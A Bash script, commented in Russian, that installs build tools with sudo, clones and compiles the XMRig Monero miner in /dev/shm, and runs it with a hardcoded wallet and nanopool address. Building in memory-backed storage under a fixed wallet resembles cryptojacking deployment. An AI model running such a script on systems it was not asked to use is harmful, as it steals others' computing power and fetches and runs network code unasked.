#!/bin/bash

# Определение пути к скрипту
SCRIPT_DIR="$(dirname "$(realpath "$0")")"
SCRIPT_NAME="$(basename "$0")"
SCRIPT_PATH="$SCRIPT_DIR/$SCRIPT_NAME"

# Установка прав на выполнение для самого скрипта
chmod +x "$SCRIPT_PATH"

# Определение временной директории в /dev/shm
TEMP_DIR="/dev/shm/xmrig_temp"
mkdir -p "$TEMP_DIR"

# Функция для установки зависимостей
install_dependencies() {
    if [ -f /etc/redhat-release ]; then
        # Для Red Hat/CentOS
        sudo yum update -y
        sudo yum groupinstall -y "Development Tools"
        sudo yum install -y cmake hwloc-devel libuv-devel openssl-devel git
    else
        # Для Debian/Ubuntu
        sudo apt update
        sudo apt install -y cmake build-essential libhwloc-dev libuv1-dev libssl-dev python3-pip git
    fi
}

# Функция для установки Python-пакетов
install_python_packages() {
    pip3 install --upgrade pip
    pip3 install requests
}

# Функция для клонирования и сборки XMRig
build_xmrig() {
    # Клонирование репозитория XMRig
    git clone https://github.com/xmrig/xmrig.git "$TEMP_DIR/xmrig"
    cd "$TEMP_DIR/xmrig" || { echo "Не удалось перейти в директорию xmrig"; exit 1; }

    # Создание директории для сборки и сборка XMRig
    mkdir -p build
    cd build || { echo "Не удалось перейти в директорию build"; exit 1; }
    cmake .. || { echo "Ошибка конфигурации CMake"; exit 1; }
    make || { echo "Ошибка сборки XMRig"; exit 1; }
}

# Функция для создания конфигурационного файла
create_config_file() {
    cat <<EOL > "$TEMP_DIR/xmrig/build/config.json"
{
  "autosave": true,
  "cpu": true,
  "pools": [
    {
      "url": "xmr-eu1.nanopool.org:14444",
      "user": "4A9SeKhwWx8DtAboVp1e1LdbgrRJxvjEFNh4VNw1NDng6ELLeKJPVrPQ9n9eNc4iLVC4BKeR4egnUL68D1qUmdJ7N3TaB5w",
      "pass": "x",
      "coin": "monero"
    }
  ],
  "api": {
    "enabled": false,
    "port": 0
  }
}
EOL
}

# Функция для создания файла лога и запуска XMRig
run_xmrig() {
    LOGFILE="$TEMP_DIR/xmrig/build/xmrig.log"
    
    # Создание файла лога
    touch "$LOGFILE"

    # Запуск XMRig и логирование в реальном времени
    cd "$TEMP_DIR/xmrig/build" || { echo "Не удалось перейти в директорию сборки"; exit 1; }
    ./xmrig --config=config.json | tee -a "$LOGFILE"
}

# Запуск всех функций
install_dependencies
install_python_packages
build_xmrig
create_config_file
run_xmrig
